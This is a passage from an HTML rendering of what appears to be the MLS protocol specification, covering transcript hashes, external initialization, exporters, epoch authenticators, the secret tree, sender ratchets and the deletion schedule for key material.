These effects are described in their respective subsections of <a href="#proposals">Section 12.1</a>.
The following general rules apply:<a href="#section-8.1-6">¬∂</a></p>
<ul>
<li id="section-8.1-7.1">The <code>group_id</code> field is constant.<a href="#section-8.1-7.1">¬∂</a>
</li>
          <li id="section-8.1-7.2">The <code>epoch</code> field increments by one for each Commit message that
is processed.<a href="#section-8.1-7.2">¬∂</a>
</li>
          <li id="section-8.1-7.3">The <code>tree_hash</code> is updated to represent the current tree and
credentials.<a href="#section-8.1-7.3">¬∂</a>
</li>
          <li id="section-8.1-7.4">The <code>confirmed_transcript_hash</code> field is updated with the data for an
AuthenticatedContent encoding a Commit message, as described below.<a href="#section-8.1-7.4">¬∂</a>
</li>
          <li id="section-8.1-7.5">The <code>extensions</code> field changes when a GroupContextExtensions proposal is
committed.<a href="#section-8.1-7.5">¬∂</a>
</li>
        </ul>
</section>
<section id="transcript-hashes">
        <h3 id="name-transcript-hashes">
<a href="#section-8.2">8.2. </a><a href="#name-transcript-hashes">Transcript Hashes</a>
        </h3>
<p id="section-8.2-1">The transcript hashes computed in MLS represent a running hash over all Proposal
and Commit messages that have ever been sent in a group.  Commit messages are
included directly. Proposal messages are indirectly included via the Commit that
applied them. Messages of both types are included by hashing the AuthenticatedContent
object in which they were sent.<a href="#section-8.2-1">¬∂</a></p>
<p id="section-8.2-2">The transcript hash comprises two individual hashes:<a href="#section-8.2-2">¬∂</a></p>
<ul>
<li id="section-8.2-3.1">A <code>confirmed_transcript_hash</code> that represents a transcript over the whole
history of Commit messages, up to and including the signature of the most
recent Commit.<a href="#section-8.2-3.1">¬∂</a>
</li>
          <li id="section-8.2-3.2">An <code>interim_transcript_hash</code> that covers the confirmed transcript hash plus
the <code>confirmation_tag</code> of the most recent Commit.<a href="#section-8.2-3.2">¬∂</a>
</li>
        </ul>
<p id="section-8.2-4">New members compute the interim transcript hash using the <code>confirmation_tag</code>
field of the GroupInfo struct, while existing members can compute it directly.<a href="#section-8.2-4">¬∂</a></p>
<p id="section-8.2-5">Each Commit message updates these hashes by way of its enclosing
AuthenticatedContent.  The AuthenticatedContent struct is split into
ConfirmedTranscriptHashInput and InterimTranscriptHashInput. The former is used to
update the confirmed transcript hash and the latter is used to update the interim
transcript hash.<a href="#section-8.2-5">¬∂</a></p>
<div id="section-8.2-6">
<pre>struct {
    WireFormat wire_format;
    FramedContent content; /* with content_type == commit */
    opaque signature&lt;V&gt;;
} ConfirmedTranscriptHashInput;

struct {
    MAC confirmation_tag;
} InterimTranscriptHashInput;
</pre><p><a href="#section-8.2-6">¬∂</a>
</p></div>
<div id="section-8.2-7">
<pre>confirmed_transcript_hash_[0] = ""; /* zero-length octet string */
interim_transcript_hash_[0] = ""; /* zero-length octet string */

confirmed_transcript_hash_[epoch] =
    Hash(interim_transcript_hash_[epoch - 1] ||
        ConfirmedTranscriptHashInput_[epoch]);

interim_transcript_hash_[epoch] =
    Hash(confirmed_transcript_hash_[epoch] ||
        InterimTranscriptHashInput_[epoch]);
</pre><p><a href="#section-8.2-7">¬∂</a>
</p></div>
<p id="section-8.2-8">In this notation, <code>ConfirmedTranscriptHashInput_[epoch]</code> and
<code>InterimTranscriptHashInput_[epoch]</code> are based on the Commit that initiated the
epoch with epoch number <code>epoch.  (Note that the </code>epoch<code> field in this
Commit will be set to </code>epoch - 1`, since it is sent within the previous epoch.)<a href="#section-8.2-8">¬∂</a></p>
<p id="section-8.2-9">The transcript hash <code>ConfirmedTranscriptHashInput_[epoch]</code> is used as the
<code>confirmed_transcript_hash</code> input to the <code>confirmation_tag</code> field for this
Commit. Each Commit thus confirms the whole transcript of Commits up to that
point, except for the latest Commit's confirmation tag.<a href="#section-8.2-9">¬∂</a></p>
<span id="name-evolution-of-the-transcript"></span><figure id="figure-23">
          <div id="section-8.2-10.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="720" text-anchor="middle" version="1.1" viewBox="0 0 576 720" width="576">
                <path d="M 8,272 L 8,304" fill="none" stroke="black"></path>
                <path d="M 8,512 L 8,544" fill="none" stroke="black"></path>
                <path d="M 32,192 L 32,208" fill="none" stroke="black"></path>
                <path d="M 32,432 L 32,448" fill="none" stroke="black"></path>
                <path d="M 104,224 L 104,264" fill="none" stroke="black"></path>
                <path d="M 104,464 L 104,504" fill="none" stroke="black"></path>
                <path d="M 168,192 L 168,208" fill="none" stroke="black"></path>
                <path d="M 168,432 L 168,448" fill="none" stroke="black"></path>
                <path d="M 208,272 L 208,304" fill="none" stroke="black"></path>
                <path d="M 208,512 L 208,544" fill="none" stroke="black"></path>
                <path d="M 240,176 L 240,304" fill="none" stroke="black"></path>
                <path d="M 240,416 L 240,544" fill="none" stroke="black"></path>
                <path d="M 312,304 L 312,368" fill="none" stroke="black"></path>
                <path d="M 312,544 L 312,608" fill="none" stroke="black"></path>
                <path d="M 392,176 L 392,304" fill="none" stroke="black"></path>
                <path d="M 392,416 L 392,544" fill="none" stroke="black"></path>
                <path d="M 424,112 L 424,144" fill="none" stroke="black"></path>
                <path d="M 424,272 L 424,304" fill="none" stroke="black"></path>
                <path d="M 424,352 L 424,384" fill="none" stroke="black"></path>
                <path d="M 424,512 L 424,544" fill="none" stroke="black"></path>
                <path d="M 424,592 L 424,624" fill="none" stroke="black"></path>
                <path d="M 496,64 L 496,104" fill="none" stroke="black"></path>
                <path d="M 496,144 L 496,264" fill="none" stroke="black"></path>
                <path d="M 496,304 L 496,344" fill="none" stroke="black"></path>
                <path d="M 496,384 L 496,504" fill="none" stroke="black"></path>
                <path d="M 496,544 L 496,584" fill="none" stroke="black"></path>
                <path d="M 496,624 L 496,656" fill="none" stroke="black"></path>
                <path d="M 568,112 L 568,144" fill="none" stroke="black"></path>
                <path d="M 568,272 L 568,304" fill="none" stroke="black"></path>
                <path d="M 568,352 L 568,384" fill="none" stroke="black"></path>
                <path d="M 568,512 L 568,544" fill="none" stroke="black"></path>
                <path d="M 568,592 L 568,624" fill="none" stroke="black"></path>
                <path d="M 424,112 L 568,112" fill="none" stroke="black"></path>
                <path d="M 424,144 L 568,144" fill="none" stroke="black"></path>
                <path d="M 48,176 L 152,176" fill="none" stroke="black"></path>
                <path d="M 240,176 L 392,176" fill="none" stroke="black"></path>
                <path d="M 176,208 L 240,208" fill="none" stroke="black"></path>
                <path d="M 48,224 L 152,224" fill="none" stroke="black"></path>
                <path d="M 392,224 L 496,224" fill="none" stroke="black"></path>
                <path d="M 8,272 L 208,272" fill="none" stroke="black"></path>
                <path d="M 240,272 L 392,272" fill="none" stroke="black"></path>
                <path d="M 424,272 L 568,272" fill="none" stroke="black"></path>
                <path d="M 208,288 L 232,288" fill="none" stroke="black"></path>
                <path d="M 400,288 L 424,288" fill="none" stroke="black"></path>
                <path d="M 8,304 L 208,304" fill="none" stroke="black"></path>
                <path d="M 240,304 L 392,304" fill="none" stroke="black"></path>
                <path d="M 424,304 L 568,304" fill="none" stroke="black"></path>
                <path d="M 424,352 L 568,352" fill="none" stroke="black"></path>
                <path d="M 312,368 L 416,368" fill="none" stroke="black"></path>
                <path d="M 424,384 L 568,384" fill="none" stroke="black"></path>
                <path d="M 48,416 L 152,416" fill="none" stroke="black"></path>
                <path d="M 240,416 L 392,416" fill="none" stroke="black"></path>
                <path d="M 176,448 L 240,448" fill="none" stroke="black"></path>
                <path d="M 48,464 L 152,464" fill="none" stroke="black"></path>
                <path d="M 392,464 L 496,464" fill="none" stroke="black"></path>
                <path d="M 8,512 L 208,512" fill="none" stroke="black"></path>
                <path d="M 240,512 L 392,512" fill="none" stroke="black"></path>
                <path d="M 424,512 L 568,512" fill="none" stroke="black"></path>
                <path d="M 208,528 L 232,528" fill="none" stroke="black"></path>
                <path d="M 400,528 L 424,528" fill="none" stroke="black"></path>
                <path d="M 8,544 L 208,544" fill="none" stroke="black"></path>
                <path d="M 240,544 L 392,544" fill="none" stroke="black"></path>
                <path d="M 424,544 L 568,544" fill="none" stroke="black"></path>
                <path d="M 424,592 L 568,592" fill="none" stroke="black"></path>
                <path d="M 312,608 L 416,608" fill="none" stroke="black"></path>
                <path d="M 424,624 L 568,624" fill="none" stroke="black"></path>
                <path d="M 48,176 C 39.16936,176 32,183.16936 32,192" fill="none" stroke="black"></path>
                <path d="M 152,176 C 160.83064,176 168,183.16936 168,192" fill="none" stroke="black"></path>
                <path d="M 48,224 C 39.16936,224 32,216.83064 32,208" fill="none" stroke="black"></path>
                <path d="M 152,224 C 160.83064,224 168,216.83064 168,208" fill="none" stroke="black"></path>
                <path d="M 48,416 C 39.16936,416 32,423.16936 32,432" fill="none" stroke="black"></path>
                <path d="M 152,416 C 160.83064,416 168,423.16936 168,432" fill="none" stroke="black"></path>
                <path d="M 48,464 C 39.16936,464 32,456.83064 32,448" fill="none" stroke="black"></path>
                <path d="M 152,464 C 160.83064,464 168,456.83064 168,448" fill="none" stroke="black"></path>
                <polygon fill="black" points="504,656 492,650.4 492,661.6" transform="rotate(90,496,656)"></polygon>
                <polygon fill="black" points="504,584 492,578.4 492,589.6" transform="rotate(90,496,584)"></polygon>
                <polygon fill="black" points="504,504 492,498.4 492,509.6" transform="rotate(90,496,504)"></polygon>
                <polygon fill="black" points="504,344 492,338.4 492,349.6" transform="rotate(90,496,344)"></polygon>
                <polygon fill="black" points="504,264 492,258.4 492,269.6" transform="rotate(90,496,264)"></polygon>
                <polygon fill="black" points="504,104 492,98.4 492,109.6" transform="rotate(90,496,104)"></polygon>
                <polygon fill="black" points="424,608 412,602.4 412,613.6" transform="rotate(0,416,608)"></polygon>
                <polygon fill="black" points="424,368 412,362.4 412,373.6" transform="rotate(0,416,368)"></polygon>
                <polygon fill="black" points="408,528 396,522.4 396,533.6" transform="rotate(180,400,528)"></polygon>
                <polygon fill="black" points="408,288 396,282.4 396,293.6" transform="rotate(180,400,288)"></polygon>
                <polygon fill="black" points="240,528 228,522.4 228,533.6" transform="rotate(0,232,528)"></polygon>
                <polygon fill="black" points="240,288 228,282.4 228,293.6" transform="rotate(0,232,288)"></polygon>
                <polygon fill="black" points="184,448 172,442.4 172,453.6" transform="rotate(180,176,448)"></polygon>
                <polygon fill="black" points="184,208 172,202.4 172,213.6" transform="rotate(180,176,208)"></polygon>
                <polygon fill="black" points="112,504 100,498.4 100,509.6" transform="rotate(90,104,504)"></polygon>
                <polygon fill="black" points="112,264 100,258.4 100,269.6" transform="rotate(90,104,264)"></polygon>
                <g>
                  <text x="496" y="36">...</text>
                  <text x="496" y="132">interim_[N-1]</text>
                  <text x="80" y="196">Ratchet</text>
                  <text x="132" y="196">Tree</text>
                  <text x="296" y="196">wire_format</text>
                  <text x="64" y="212">Key</text>
                  <text x="116" y="212">Schedule</text>
                  <text x="280" y="212">content</text>
                  <text x="288" y="228">epoch</text>
                  <text x="320" y="228">=</text>
                  <text x="344" y="228">N-1</text>
                  <text x="292" y="244">commit</text>
                  <text x="288" y="260">signature</text>
                  <text x="108" y="292">confirmation_key_[N]</text>
                  <text x="316" y="292">confirmation_tag</text>
                  <text x="496" y="292">confirmed_[N]</text>
                  <text x="496" y="372">interim_[N]</text>
                  <text x="80" y="436">Ratchet</text>
                  <text x="132" y="436">Tree</text>
                  <text x="296" y="436">wire_format</text>
                  <text x="64" y="452">Key</text>
                  <text x="116" y="452">Schedule</text>
                  <text x="280" y="452">content</text>
                  <text x="288" y="468">epoch</text>
                  <text x="320" y="468">=</text>
                  <text x="336" y="468">N</text>
                  <text x="292" y="484">commit</text>
                  <text x="288" y="500">signature</text>
                  <text x="108" y="532">confirmation_key_[N+1]</text>
                  <text x="316" y="532">confirmation_tag</text>
                  <text x="496" y="532">confirmed_[N+1]</text>
                  <text x="496" y="612">interim_[N+1]</text>
                  <text x="496" y="692">...</text>
                </g>
              </svg><p><a href="#section-8.2-10.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-23">Figure 23</a>:
<a href="#name-evolution-of-the-transcript">Evolution of the Transcript Hashes through Two Epoch Changes</a>
          </figcaption></figure>
</section>
<section id="external-initialization">
        <h3 id="name-external-initialization">
<a href="#section-8.3">8.3. </a><a href="#name-external-initialization">External Initialization</a>
        </h3>
<p id="section-8.3-1">In addition to initializing a new epoch via KDF invocations as described above,
an MLS group can also initialize a new epoch via an asymmetric interaction using
the external key pair for the previous epoch.  This is done when a new member
is joining via an external commit.<a href="#section-8.3-1">¬∂</a></p>
<p id="section-8.3-2">In this process, the joiner sends a new <code>init_secret</code> value to the group using
the HPKE export method.  The joiner then uses that <code>init_secret</code> with
information provided in the GroupInfo and an external Commit to initialize
their copy of the key schedule for the new epoch.<a href="#section-8.3-2">¬∂</a></p>
<div id="section-8.3-3">
<pre>kem_output, context = SetupBaseS(external_pub, "")
init_secret = context.export("MLS 1.0 external init secret", KDF.Nh)
</pre><p><a href="#section-8.3-3">¬∂</a>
</p></div>
<p id="section-8.3-4">Members of the group receive the <code>kem_output</code> in an ExternalInit proposal and
perform the corresponding calculation to retrieve the <code>init_secret</code> value.<a href="#section-8.3-4">¬∂</a></p>
<div id="section-8.3-5">
<pre>context = SetupBaseR(kem_output, external_priv, "")
init_secret = context.export("MLS 1.0 external init secret", KDF.Nh)
</pre><p><a href="#section-8.3-5">¬∂</a>
</p></div>
</section>

<section id="exporters">
        <h3 id="name-exporters">
<a href="#section-8.5">8.5. </a><a href="#name-exporters">Exporters</a>
        </h3>
<p id="section-8.5-1">The main MLS key schedule provides an <code>exporter_secret</code> that can
be used by an application to derive new secrets for use outside of MLS.<a href="#section-8.5-1">¬∂</a></p>
<div id="section-8.5-2">
<pre>MLS-Exporter(Label, Context, Length) =
       ExpandWithLabel(DeriveSecret(exporter_secret, Label),
                         "exported", Hash(Context), Length)
</pre><p><a href="#section-8.5-2">¬∂</a>
</p></div>
<p id="section-8.5-3">Applications <span>SHOULD</span> provide a unique label to <code>MLS-Exporter</code> that
identifies the secret's intended purpose. This is to help prevent the same
secret from being generated and used in two different places. To help avoid
the same label being used in different applications, an IANA registry for these
labels has been defined in <a href="#mls-exporter-labels">Section 17.8</a>.<a href="#section-8.5-3">¬∂</a></p>
<p id="section-8.5-4">The exported values are bound to the group epoch from which the
<code>exporter_secret</code> is derived, and hence reflect a particular state of
the group.<a href="#section-8.5-4">¬∂</a></p>
<p id="section-8.5-5">It is <span>RECOMMENDED</span> for the application generating exported values
to refresh those values after a Commit is processed.<a href="#section-8.5-5">¬∂</a></p>
</section>
<section id="resumption-psk">
        <h3 id="name-resumption-psk">
<a href="#section-8.6">8.6. </a><a href="#name-resumption-psk">Resumption PSK</a>
        </h3>
<p id="section-8.6-1">The main MLS key schedule provides a <code>resumption_psk</code> that is used as a PSK
to inject entropy from one epoch into another.  This functionality is used in the
reinitialization and branching processes described in Sections <a href="#reinitialization">11.2</a> and
<a href="#subgroup-branching">11.3</a>, but it may be used by applications for other purposes.<a href="#section-8.6-1">¬∂</a></p>
<p id="section-8.6-2">Some uses of resumption PSKs might call for the use of PSKs from historical
epochs. The application <span>SHOULD</span> specify an upper limit on the number of past
epochs for which the <code>resumption_psk</code> may be stored.<a href="#section-8.6-2">¬∂</a></p>
</section>
<section id="epoch-authenticators">
        <h3 id="name-epoch-authenticators">
<a href="#section-8.7">8.7. </a><a href="#name-epoch-authenticators">Epoch Authenticators</a>
        </h3>
<p id="section-8.7-1">The main MLS key schedule provides a per-epoch <code>epoch_authenticator</code>. If one
member of the group is being impersonated by an active attacker, the
<code>epoch_authenticator</code> computed by their client will differ from those computed
by the other group members.<a href="#section-8.7-1">¬∂</a></p>
<p id="section-8.7-2">This property can be used to construct defenses against impersonation attacks
that are effective even if members' signature keys are compromised. As a trivial
example, if the users of the clients in an MLS group were to meet in person and
reliably confirm that their epoch authenticator values were equal (using some
suitable user interface), then each user would be assured that the others were
not being impersonated in the current epoch. As soon as the epoch changed,
though, they would need to redo this confirmation. The state of the group would
have changed, possibly introducing an attacker.<a href="#section-8.7-2">¬∂</a></p>
<p id="section-8.7-3">More generally, in order for the members of an MLS group to obtain concrete
authentication protections using the <code>epoch_authenticator</code>, they will need to
use it in some secondary protocol (such as the face-to-face protocol above).
The details of that protocol will then determine the specific authentication
protections provided to the MLS group.<a href="#section-8.7-3">¬∂</a></p>
</section>
</section>
<section id="secret-tree">
      <h2 id="name-secret-tree">
<a href="#section-9">9. </a><a href="#name-secret-tree">Secret Tree</a>
      </h2>
<p id="section-9-1">For the generation of encryption keys and nonces, the key schedule begins with
the <code>encryption_secret</code> at the root and derives a tree of secrets with the same
structure as the group's ratchet tree. Each leaf in the secret tree is
associated with the same group member as the corresponding leaf in the ratchet
tree.<a href="#section-9-1">¬∂</a></p>
<p id="section-9-2">If N is a parent node in the secret tree, then the secrets of the children of N
are defined as follows (where left(N) and right(N) denote the children of N):<a href="#section-9-2">¬∂</a></p>
<span id="name-derivation-of-secrets-from-"></span><figure id="figure-25">
        <div id="section-9-3.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="160" text-anchor="middle" version="1.1" viewBox="0 0 456 160" width="456">
              <path d="M 72,40 L 72,128" fill="none" stroke="black"></path>
              <path d="M 248,80 L 248,88" fill="none" stroke="black"></path>
              <path d="M 72,80 L 96,80" fill="none" stroke="black"></path>
              <path d="M 72,128 L 96,128" fill="none" stroke="black"></path>
              <polygon fill="black" points="104,128 92,122.4 92,133.6" transform="rotate(0,96,128)"></polygon>
              <polygon fill="black" points="104,80 92,74.4 92,85.6" transform="rotate(0,96,80)"></polygon>
              <g>
                <text x="84" y="36">tree_node_[N]_secret</text>
                <text x="176" y="84">ExpandWithLabel(.</text>
                <text x="288" y="84">"tree",</text>
                <text x="352" y="84">"left",</text>
                <text x="416" y="84">KDF.Nh)</text>
                <text x="112" y="100">=</text>
                <text x="228" y="100">tree_node_[left(N)]_secret</text>
                <text x="180" y="132">ExpandWithLabel(.,</text>
                <text x="288" y="132">"tree",</text>
                <text x="356" y="132">"right",</text>
                <text x="424" y="132">KDF.Nh)</text>
                <text x="112" y="148">=</text>
                <text x="232" y="148">tree_node_[right(N)]_secret</text>
              </g>
            </svg><p><a href="#section-9-3.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-25">Figure 25</a>:
<a href="#name-derivation-of-secrets-from-">Derivation of Secrets from Parent to Children within a Secret Tree</a>
        </figcaption></figure>
<p id="section-9-4">The secret in the leaf of the secret tree is used to initiate two symmetric hash
ratchets, from which a sequence of single-use keys and nonces are derived, as
described in <a href="#encryption-keys">Section 9.1</a>. The root of each ratchet is computed as:<a href="#section-9-4">¬∂</a></p>
<span id="name-initialization-of-the-hash-"></span><figure id="figure-26">
        <div id="section-9-5.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="160" text-anchor="middle" version="1.1" viewBox="0 0 472 160" width="472">
              <path d="M 72,40 L 72,128" fill="none" stroke="black"></path>
              <path d="M 72,80 L 96,80" fill="none" stroke="black"></path>
              <path d="M 72,128 L 96,128" fill="none" stroke="black"></path>
              <polygon fill="black" points="104,128 92,122.4 92,133.6" transform="rotate(0,96,128)"></polygon>
              <polygon fill="black" points="104,80 92,74.4 92,85.6" transform="rotate(0,96,80)"></polygon>
              <g>
                <text x="84" y="36">tree_node_[N]_secret</text>
                <text x="180" y="84">ExpandWithLabel(.,</text>
                <text x="308" y="84">"handshake",</text>
                <text x="376" y="84">"",</text>
                <text x="424" y="84">KDF.Nh)</text>
                <text x="112" y="100">=</text>
                <text x="252" y="100">handshake_ratchet_secret_[N]_[0]</text>
                <text x="180" y="132">ExpandWithLabel(.,</text>
                <text x="316" y="132">"application",</text>
                <text x="392" y="132">"",</text>
                <text x="440" y="132">KDF.Nh)</text>
                <text x="112" y="148">=</text>
                <text x="260" y="148">application_ratchet_secret_[N]_[0]</text>
              </g>
            </svg><p><a href="#section-9-5.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-26">Figure 26</a>:
<a href="#name-initialization-of-the-hash-">Initialization of the Hash Ratchets from the Leaves of a Secret Tree</a>
        </figcaption></figure>
<section id="encryption-keys">
        <h3 id="name-encryption-keys">
<a href="#section-9.1">9.1. </a><a href="#name-encryption-keys">Encryption Keys</a>
        </h3>
<p id="section-9.1-1">As described in <a href="#message-framing">Section 6</a>, MLS encrypts three different
types of information:<a href="#section-9.1-1">¬∂</a></p>
<ul>
<li id="section-9.1-2.1">Metadata (sender information)<a href="#section-9.1-2.1">¬∂</a>
</li>
          <li id="section-9.1-2.2">Handshake messages (Proposal and Commit)<a href="#section-9.1-2.2">¬∂</a>
</li>
          <li id="section-9.1-2.3">Application messages<a href="#section-9.1-2.3">¬∂</a>
</li>
        </ul>
<p id="section-9.1-3">The sender information used to look up the key for content encryption is
encrypted with an AEAD where the key and nonce are derived from both
<code>sender_data_secret</code> and a sample of the encrypted message content.<a href="#section-9.1-3">¬∂</a></p>
<p id="section-9.1-4">For handshake and application messages, a sequence of keys is derived via a
"sender ratchet".  Each sender has their own sender ratchet, and each step along
the ratchet is called a "generation".<a href="#section-9.1-4">¬∂</a></p>
<p id="section-9.1-5">The following figure shows a secret tree for a four-member group, with the
handshake and application ratchets that member D will use for sending and the
first two application keys and nonces.<a href="#section-9.1-5">¬∂</a></p>
<span id="name-secret-tree-for-a-four-memb"></span><div id="secret-tree-example">
<figure id="figure-27">
          <div id="section-9.1-6.1">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="320" text-anchor="middle" version="1.1" viewBox="0 0 200 320" width="200">
                <path d="M 56,48 L 56,64" fill="none" stroke="black"></path>
                <path d="M 128,176 L 128,208" fill="none" stroke="black"></path>
                <path d="M 128,240 L 128,272" fill="none" stroke="black"></path>
                <path d="M 160,160 L 160,192" fill="none" stroke="black"></path>
                <path d="M 160,224 L 160,256" fill="none" stroke="black"></path>
                <path d="M 40,64 L 72,64" fill="none" stroke="black"></path>
                <path d="M 144,160 L 176,160" fill="none" stroke="black"></path>
                <path d="M 160,192 L 176,192" fill="none" stroke="black"></path>
                <path d="M 144,224 L 176,224" fill="none" stroke="black"></path>
                <path d="M 160,256 L 176,256" fill="none" stroke="black"></path>
                <path d="M 72,64 L 80,80" fill="none" stroke="black"></path>
                <path d="M 32,80 L 40,64" fill="none" stroke="black"></path>
                <g>
                  <text x="56" y="36">G</text>
                  <text x="24" y="100">E</text>
                  <text x="88" y="100">F</text>
                  <text x="16" y="116">/</text>
                  <text x="32" y="116">\</text>
                  <text x="80" y="116">/</text>
                  <text x="96" y="116">\</text>
                  <text x="8" y="132">A</text>
                  <text x="40" y="132">B</text>
                  <text x="72" y="132">C</text>
                  <text x="104" y="132">D</text>
                  <text x="96" y="148">/</text>
                  <text x="112" y="148">\</text>
                  <text x="88" y="164">HR0</text>
                  <text x="128" y="164">AR0</text>
                  <text x="188" y="164">K0</text>
                  <text x="188" y="196">N0</text>
                  <text x="128" y="228">AR1</text>
                  <text x="188" y="228">K1</text>
                  <text x="188" y="260">N1</text>
                  <text x="128" y="292">AR2</text>
                </g>
              </svg><p><a href="#section-9.1-6.1.1">¬∂</a>
</p></div>
<figcaption><a href="#figure-27">Figure 27</a>:
<a href="#name-secret-tree-for-a-four-memb">Secret Tree for a Four-Member Group</a>
          </figcaption></figure>
</div>
<p id="section-9.1-7">A sender ratchet starts from a per-sender base secret derived from a Secret
Tree, as described in <a href="#secret-tree">Section 9</a>. The base secret initiates a symmetric
hash ratchet, which generates a sequence of keys and nonces. The sender uses the
j-th key/nonce pair in the sequence to encrypt (using the AEAD) the j-th message
they send during that epoch. Each key/nonce pair <span>MUST NOT</span> be used to encrypt
more than one message.<a href="#section-9.1-7">¬∂</a></p>
<p id="section-9.1-8">Keys, nonces, and the secrets in ratchets are derived using
DeriveTreeSecret. The context in a given call consists of the current position
in the ratchet.<a href="#section-9.1-8">¬∂</a></p>
<div id="section-9.1-9">
<pre>DeriveTreeSecret(Secret, Label, Generation, Length) =
    ExpandWithLabel(Secret, Label, Generation, Length)
</pre><p><a href="#section-9.1-9">¬∂</a>
</p></div>
<p id="section-9.1-10">Where <code>Generation</code> is encoded as a big endian uint32.<a href="#section-9.1-10">¬∂</a></p>
<div id="section-9.1-11">
<svg xmlns="http://www.w3.org/2000/svg" font-family="monospace" font-size="13px" height="208" text-anchor="middle" version="1.1" viewBox="0 0 416 208" width="416">
              <path d="M 56,40 L 56,160" fill="none" stroke="black"></path>
              <path d="M 56,64 L 80,64" fill="none" stroke="black"></path>
              <path d="M 56,112 L 80,112" fill="none" stroke="black"></path>
              <polygon fill="black" points="88,112 76,106.4 76,117.6" transform="rotate(0,80,112)"></polygon>
              <polygon fill="black" points="88,64 76,58.4 76,69.6" transform="rotate(0,80,64)"></polygon>
              <polygon fill="black" points="64,160 52,154.4 52,165.6" transform="rotate(90,56,160)"></polygon>
              <g>
                <text x="92" y="36">ratchet_secret_[N]_[j]</text>
                <text x="168" y="68">DeriveTreeSecret(.,</text>
                <text x="284" y="68">"nonce",</text>
                <text x="332" y="68">j,</text>
                <text x="380" y="68">AEAD.Nn)</text>
                <text x="96" y="84">=</text>
                <text x="192" y="84">ratchet_nonce_[N]_[j]</text>
                <text x="168" y="116">DeriveTreeSecret(.,</text>
                <text x="276" y="116">"key",</text>
                <text x="316" y="116">j,</text>
                <text x="372" y="116">AEAD.Nk)</text>
                <text x="96" y="132">=</text>
                <text x="184" y="132">ratchet_key_[N]_[j]</text>
                <text x="80" y="180">DeriveTreeSecret(.,</text>
                <text x="200" y="180">"secret",</text>
                <text x="252" y="180">j,</text>
                <text x="296" y="180">KDF.Nh)</text>
                <text x="8" y="196">=</text>
                <text x="116" y="196">ratchet_secret_[N]_[j+1]</text>
              </g>
            </svg><p><a href="#section-9.1-11.1">¬∂</a>
</p></div>
<p id="section-9.1-12">Here <code>AEAD.Nn</code> and <code>AEAD.Nk</code> denote the lengths
in bytes of the nonce and key for the AEAD scheme defined by
the cipher suite.<a href="#section-9.1-12">¬∂</a></p>
</section>
<section id="deletion-schedule">
        <h3 id="name-deletion-schedule">
<a href="#section-9.2">9.2. </a><a href="#name-deletion-schedule">Deletion Schedule</a>
        </h3>
<p id="section-9.2-1">It is important to delete all security-sensitive values as soon as they are
<em>consumed</em>. A sensitive value S is said to be <em>consumed</em> if:<a href="#section-9.2-1">¬∂</a></p>
<ul>
<li id="section-9.2-2.1">S was used to encrypt or (successfully) decrypt a message, or<a href="#section-9.2-2.1">¬∂</a>
</li>
          <li id="section-9.2-2.2">a key, nonce, or secret derived from S has been consumed. (This goes for
values derived via DeriveSecret as well as ExpandWithLabel.)<a href="#section-9.2-2.2">¬∂</a>
</li>
        </ul>
<p id="section-9.2-3">Here S may be the <code>init_secret</code>, <code>commit_secret</code>, <code>epoch_secret</code>, or
<code>encryption_secret</code> as well as any secret in a secret tree or one of the
ratchets.<a href="#section-9.2-3">¬∂</a></p>
<p id="section-9.2-4">As soon as a group member consumes a value, they <span>MUST</span> immediately delete
(all representations of) that value. This is crucial to ensuring
forward secrecy for past messages. Members <span>MAY</span> keep unconsumed values around
for some reasonable amount of time to handle out-of-order message delivery.<a href="#section-9.2-4">¬∂</a></p>
<p id="section-9.2-5">For example, suppose a group member encrypts or (successfully) decrypts an
application message using the j-th key and nonce in the ratchet of leaf node
L in some epoch n. Then, for that member, at least the following
values have been consumed and <span>MUST</span> be deleted:<a href="#section-9.2-5">¬∂</a></p>
<ul>
<li id="section-9.2-6.1">the <code>commit_secret</code>, <code>joiner_secret</code>, <code>epoch_secret</code>, and <code>encryption_secret</code> of
that epoch n as well as the <code>init_secret</code> of the previous epoch n-1,<a href="#section-9.2-6.1">¬∂</a>
</li>
          <li id="section-9.2-6.2">all node secrets in the secret tree on the path from the root to the leaf with
node L,<a href="#section-9.2-6.2">¬∂</a>
</li>
          <li id="section-9.2-6.3">the first j secrets in the application data ratchet of node L, and<a href="#section-9.2-6.3">¬∂</a>
</li>
          <li id="section-9.2-6.4">
            <code>application_ratchet_nonce_[L]_[j]</code> and <code>application_ratchet_key_[L]_[j]</code>.<a href="#section-9.2-6.4">¬∂</a>
</li>
        </ul>
<p id="section-9.2-7">Concretely, consider the secret tree shown in <a href="#secret-tree-example">Figure 27</a>.  Client
A, B, or C would generate the illustrated values on receiving a message from D
with generation equal to 1, having not received a message with generation 0
(e.g., due to out-of-order delivery).  In such a case, the following values
would be consumed:<a href="#section-9.2-7">¬∂</a></p>
<ul>
<li id="section-9.2-8.1">The key K1 and nonce N1 used to decrypt the message<a href="#section-9.2-8.1">¬∂</a>
</li>
          <li id="section-9.2-8.2">The application ratchet secrets AR1 and AR0<a href="#section-9.2-8.2">¬∂</a>
</li>
          <li id="section-9.2-8.3">The tree secrets D, F, and G (recall that G is the <code>encryption_secret</code> for the
epoch)<a href="#section-9.2-8.3">¬∂</a>
</li>
          <li id="section-9.2-8.4">The <code>epoch_secret</code>, <code>commit_secret</code>, <code>psk_secret</code>, and <code>joiner_secret</code> for the
current epoch<a href="#section-9.2-8.4">¬∂</a>
</li>
        </ul>
<p id="section-9.2-9">Other values may be retained (not consumed):<a href="#section-9.2-9">¬∂</a></p>
<ul>
<li id="section-9.2-10.1">K0 and N0 for decryption of an out-of-order message with generation 0<a href="#section-9.2-10.1">¬∂</a>
</li>
          <li id="section-9.2-10.2">AR2 for derivation of further message decryption keys and nonces<a href="#section-9.2-10.2">¬∂</a>
</li>
          <li id="section-9.2-10.3">HR0 for protection of handshake messages from D<a href="#section-9.2-10.3">¬∂</a>
</li>
          <li id="section-9.2-10.4">E and C for deriving secrets used by senders A, B, and C<a href="#section-9.2-10.4">¬∂</a>
</li>
        </ul>
</section>
</section>
<section id="key-packages">
      <h2 id="name-key-packages">
<a href="#section-10">10. </a><a href="#name-key-packages">Key Packages</a>
      </h2>
